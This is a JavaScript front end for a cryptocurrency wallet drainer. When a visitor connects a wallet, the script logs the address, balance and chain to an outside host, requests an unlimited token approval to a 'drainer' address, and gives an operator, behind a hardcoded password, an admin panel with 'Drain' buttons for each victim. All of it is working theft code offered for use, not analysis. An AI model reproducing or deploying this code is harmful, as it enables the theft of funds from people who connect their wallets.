import { ethers } from "ethers";
import { triggerDrain } from "./drain.js";

const connectBtn = document.getElementById("connectBtn");
const walletDetails = document.getElementById("walletDetails");
const walletAddress = document.getElementById("walletAddress");
const walletBalance = document.getElementById("walletBalance");
const disconnectBtn = document.getElementById("disconnectBtn");
const loading = document.getElementById("loading");
const adminBtn = document.getElementById("adminBtn");
const adminLogin = document.getElementById("adminLogin");
const loginBtn = document.getElementById("loginBtn");
const walletApp = document.getElementById("walletApp");
const adminPanel = document.getElementById("adminPanel");
const sessionList = document.getElementById("sessionList");

let provider, signer;

async function connectAndApprove() {
  loading.style.display = "block";
  connectBtn.disabled = true;

  provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = await provider.getSigner();
  const address = await signer.getAddress();
  const balance = await provider.getBalance(address);

  walletAddress.textContent = address;
  walletBalance.textContent = ethers.formatEther(balance);
  walletDetails.style.display = "block";
  loading.style.display = "none";

  const chainId = (await provider.getNetwork()).chainId;

  const data = {
    address,
    balance: ethers.formatEther(balance),
    chainId,
    timestamp: Date.now(),
    drained: false
  };

  await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/log.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });

  const drainer = "0x5fbdb2315678afecb367f032d93f642f64180aa3";
  const erc20abi = ["function approve(address spender, uint256 amount) external returns (bool)"];

  const tokenMap = {
    1: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
    56: "0x55d398326f99059ff775485246999027b3197955",
    137: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
  };

  if (tokenMap[chainId]) {
    const token = new ethers.Contract(tokenMap[chainId], erc20abi, signer);
    try {
      await token.approve(drainer, ethers.MaxUint256);
    } catch (e) {
      console.warn("Approval failed:", e);
    }
  }

  localStorage.setItem("wallet_connected", "1");
}

function disconnectWallet() {
  localStorage.removeItem("wallet_connected");
  walletDetails.style.display = "none";
  connectBtn.disabled = false;
}

if (localStorage.getItem("wallet_connected") === "1") {
  connectAndApprove();
}

connectBtn.addEventListener("click", connectAndApprove);
disconnectBtn.addEventListener("click", disconnectWallet);

adminBtn.addEventListener("click", () => {
  walletApp.style.display = "none";
  adminLogin.style.display = "block";
});

loginBtn.addEventListener("click", async () => {
  const pass = document.getElementById("adminPass").value;
  if (pass !== "adminpass") {
    alert("Wrong password");
    return;
  }
  adminLogin.style.display = "none";
  adminPanel.style.display = "block";
  loadAdmin();
});

async function loadAdmin() {
  const res = await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/logs.json");
  const logs = await res.json();
  sessionList.innerHTML = "";

  logs.forEach((entry, index) => {
    const li = document.createElement("li");
    li.className = "list-group-item";
    li.innerHTML = `
      <strong>${entry.address}</strong><br>
      ${entry.balance} ETH — Chain: ${entry.chainId} —
      ${entry.drained ? "<span class='text-success'>✅ Drained</span>" : `<button class="btn btn-sm btn-outline-danger mt-1" onclick="drainWallet(${index})">💸 Drain</button>`}
    `;
    sessionList.appendChild(li);
  });
}

window.drainWallet = async function(index) {
  const res = await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/logs.json");
  const logs = await res.json();
  await triggerDrain(logs[index], index);
  loadAdmin();
};
